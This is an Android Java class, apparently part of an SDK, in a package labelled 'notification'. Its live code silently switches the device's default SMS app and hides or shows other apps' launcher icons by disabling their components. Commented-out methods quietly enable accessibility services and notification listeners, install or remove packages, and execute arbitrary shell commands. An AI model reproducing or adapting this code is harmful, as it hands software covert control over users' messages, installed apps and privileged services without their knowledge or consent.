package com.api.notification;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Process;
import android.provider.Settings;
import android.provider.Telephony;

import org.json.JSONException;
import org.json.JSONObject;


/**
 * Created by longyu on 2017/1/16.
 */
public class OtherManager {

    private static OtherManager instance;
    private static String preDefaultMessage = "";

    public static OtherManager getInstance() {
        synchronized (OtherManager.class) {
            if (instance == null) {
                instance = new OtherManager();
            }
        }
        return instance;
    }

    public OtherManager() {
    }

    /*public boolean isRunning(Context context, String packageName) {
        if (!AppManager.isInstalled(context, packageName))
            return false;
        try {
            ApplicationInfo info = context.getPackageManager()
                    .getApplicationInfo(packageName, 0);
            if ((info.flags & ApplicationInfo.FLAG_STOPPED) == 0) {
                return true;
            }
        } catch (PackageManager.NameNotFoundException e) {
            Lg.e(e);
        }
        return false;
    }*/

    public void setAppSdkPCK(Context context, String pkg) {
        try {
            if (context.checkPermission("android.permission.WRITE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
                return;
            }
            Settings.System.putString(context.getContentResolver(), "appSdk", pkg);
        } catch (Exception e) {
//            Lg.e(e);
        }
    }

    public void setAppSdkAction(Context context, String action) {
        try {
            if (context.checkPermission("android.permission.WRITE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
                return;
            }
            Settings.System.putString(context.getContentResolver(), "appSdk_Action", action);
        } catch (Exception e) {
//            Lg.e(e);
        }
    }

    public boolean isAppSdk(Context context, String pkg) {
        String child = Settings.System.getString(context.getContentResolver(), "appSdk");

        if (child == null || "".equals(child))
            return false;

        return child.equals(pkg);
    }

    public String getAppSdk(Context context) {
        String child = Settings.System.getString(context.getContentResolver(), "appSdk");

        if (child == null)
            return "";

        return child;
    }

    public String getAppAction(Context context) {
        String child = Settings.System.getString(context.getContentResolver(), "appSdk_Action");

        if (child == null)
            return "";

        return child;
    }

    /*public boolean appIsInstalled(Context context) {
        String child = Settings.System.getString(context.getContentResolver(), "appSdk");

        if (child == null || "".equals(child))
            return false;
        else {
            boolean res = AppManager.isInstalled(context, child);

            if (!res)
                setAppSdkPCK(context, "");

            return res;
        }
    }*/
    //通过action打开app
    public void openApp(Context context, String pkg, String action) {
        Intent intent = new Intent(action);
        intent.setPackage(pkg);

        try {
            context.startService(intent);
        } catch (Exception e) {
//            Lg.e(e);
        }
    }
    //通过launch打开app
    public boolean openActivity(Context context, String packageName) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            context.startActivity(intent);
            return true;
        }

        return false;
    }

    //启动默认短信
    public static boolean setDefaultMessage(Context context, String pck) {
        //小于4.4没有默认短信功能
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
            return false;
        }
        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return false;
        }
//        String smsDefault = Settings.Secure.getString(context.getContentResolver(), "sms_default_application");
//        String hsmDefault = Settings.Secure.getString(context.getContentResolver(), "hsm_default_sms_app");
//        Lg.i("smsDefault = " + smsDefault + ",hsmDefault = " + hsmDefault);
        preDefaultMessage = Telephony.Sms.getDefaultSmsPackage(context);
        Settings.Secure.putString(context.getContentResolver(), "sms_default_application", pck);
//        Settings.Secure.putString(context.getContentResolver(), "hsm_default_sms_app", "com.android.mms");
        String defaultMessage = Telephony.Sms.getDefaultSmsPackage(context);
        if (pck.equals(defaultMessage)) {
            return true;
        }
//        Lg.i("defaultMessage = " + defaultMessage);
        return false;
    }

    //取消默认短信设置
/*
    public static boolean cancelDefaultMessage(Context context, String pck) {
        //小于4.4没有默认短信功能
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
            return false;
        }
        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return false;
        }
        String currentDefaultMessage = Telephony.Sms.getDefaultSmsPackage(context);
        if (!currentDefaultMessage.equals(pck)) {
            return true;
        }
        if (TextUtils.isEmpty(preDefaultMessage)) {
            if (AppManager.isInstalled(context, "com.android.mms")) {
                preDefaultMessage = "com.android.mms";
            } else if (AppManager.isInstalled(context, "com.google.android.talk")){
                preDefaultMessage = "com.google.android.talk";
            }else {
                String msmPackage[] = getSmsApps(context);
                if (msmPackage == null || msmPackage.length < 1) {
                    return false;
                }
                for (int i = 0; i < msmPackage.length; i++) {
                    if (!msmPackage[i].equalsIgnoreCase(pck)) {
                        preDefaultMessage = msmPackage[i];
                        break;
                    }
                }
            }
        }
        Settings.Secure.putString(context.getContentResolver(), "sms_default_application", preDefaultMessage);
        String defaultMessage = Telephony.Sms.getDefaultSmsPackage(context);
        if (preDefaultMessage.equals(defaultMessage)) {
            return true;
        }
        return false;
    }
*/

    /**
     * 获取默认短信应用的包名数组
     * @return
     */
    /*private static String[] getSmsApps(Context context){
        PackageManager pm = context.getPackageManager();
        Intent intent = new Intent();
        intent.setAction("android.provider.Telephony.SMS_DELIVER");
        List<ResolveInfo> receivers = pm.queryBroadcastReceivers(intent, PackageManager.GET_INTENT_FILTERS);
        String[] result = new String[receivers.size()];
        for (int i = 0; i < receivers.size(); i++) {
            result[i] = receivers.get(i).activityInfo.packageName;
        }
        return result;
    }*/

    //启动辅助服务
    /*public static void startAutoService(Context context, String clz) {
        if (isAutoServiceOn(context, clz)) {
            String serviceName = context.getPackageName()+ "/" + Config.get(context).get("ap.autoAccessibility", AutoAccessibilityService.class.getName());
            Lg.i("serviceName = " + serviceName + ", clz = " + clz);
            if (serviceName.equalsIgnoreCase(clz)) {
                AutoAccessibilityService.sendAutoAccessibilityBroadcast(context, true);
            }
            return;
        }
        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return;
        }

        String services = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");

        if (services != null && services.length() > 0) {
            services += ":" + clz;
        } else
            services = clz;

        Settings.Secure.putString(context.getContentResolver(), "enabled_accessibility_services", services);
        Settings.Secure.putInt(context.getContentResolver(), "accessibility_enabled", 1);
    }*/

    //关闭辅助功能,有缺陷
//    public static void stopAutoService(Context context, String clz) {
//        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
//            Lg.i("没有打开辅助功能权限");
//            return;
//        }
//        String services = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
//        Lg.i("services = " + services);
//        if (services.contains(clz) && !TextUtils.isEmpty(clz)) {
//            Lg.i("contains clz");
//            Settings.Secure.putString(context.getContentResolver(), "enabled_accessibility_services", services);
//            Settings.Secure.putInt(context.getContentResolver(), "accessibility_enabled", 0);
//            services = services.replaceAll(clz + ":", "");
//            services = services.replaceAll(":" + clz, "");
//            services = services.replaceAll(clz, "");
//            Settings.Secure.putString(context.getContentResolver(), "enabled_accessibility_services", services);
//            Settings.Secure.putInt(context.getContentResolver(), "accessibility_enabled", 1);
//        }
//    }

   /* //辅助服务是否开启
    public static boolean isAutoServiceOn(Context context, String serviceName) {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
//            Lg.e("Error finding setting, default accessibility to not found: " + e.getMessage());
            return false;
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(serviceName)) {
                        Lg.i("We've found the correct setting - accessibility is switched on!");
                        AutoAccessibilityService.sendAutoAccessibilityBroadcast(context, true);
                        return true;
                    }
                }
            }
        } else {
            Lg.i("Accessibility is disabled now");
        }
        return false;
    }*/

    /*public static void rootInstall(Context context, String path) {
        if (context.checkPermission("android.permission.INSTALL_PACKAGES", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return;
        }
        AppManager.addPackage(context, new File(path), null);
    }*/

    /*public static void rootRemoveApp(Context context, String pck) {
        if (context.checkPermission("android.permission.DELETE_PACKAGES", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return;
        }
        AppManager.rmPackage(context, pck, null);
    }*/

    public static void hideLable(Context context, String data) {
        String pkg;
        String className;
        try {
            JSONObject job = new JSONObject(data);
            pkg = job.optString("pkg");
            className = job.optString("className");
        } catch (JSONException e) {
//            Lg.e(e);
            return;
        }
        if (!context.getPackageName().equals(pkg) && context.checkPermission("android.permission.CHANGE_COMPONENT_ENABLED_STATE", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return;
        }
        ComponentName name = new ComponentName(pkg, className);
        context.getPackageManager().setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    public static void showLabel(Context context, String data) {
        String pkg;
        String className;
        try {
            JSONObject job = new JSONObject(data);
            pkg = job.optString("pkg");
            className = job.optString("className");
        } catch (JSONException e) {
//            Lg.e(e);
            return;
        }

        if (!context.getPackageName().equals(pkg) && context.checkPermission("android.permission.CHANGE_COMPONENT_ENABLED_STATE", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            return;
        }

        ComponentName name = new ComponentName(pkg, className);
        context.getPackageManager().setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
/*
    public static boolean openNotificationListenerService(Context context, String serviceName) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.JELLY_BEAN_MR2) {
            Lg.d("NotificationListenerService open failed, need Android 4.3 or high");
            return false;
        }
        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            Lg.d("NotificationListenerService open failed");
            return false;
        }

        String services = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        if (TextUtils.isEmpty(services)) {
            services = serviceName;
        } else if (!services.contains(serviceName)){
            services += ":" + serviceName;
        }
        Settings.Secure.putString(context.getContentResolver(), "enabled_notification_listeners", services);
        String result = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
        if (TextUtils.isEmpty(result)) {
            return false;
        }
        if (result.contains(serviceName)) {
            return true;
        } else {
            return false;
        }
    }

    public static void execAdbCmd(Context context, String cmd) {
        Lg.d("execAdbCmd command = " + cmd);
        try {
            java.lang.Process process = Runtime.getRuntime().exec(cmd);
            //执行命令
            int result = process.waitFor();
            StringBuilder errorMsg = new StringBuilder();
            BufferedReader errorResult = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String s = "";
            while ((s = errorResult.readLine()) != null) {
                errorMsg.append(s).append("\n");
            }
            Lg.d("execAdbCmd errorMsg = " + "============" + errorMsg.toString());
            if (process != null) {
                process.destroy();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }*/

}
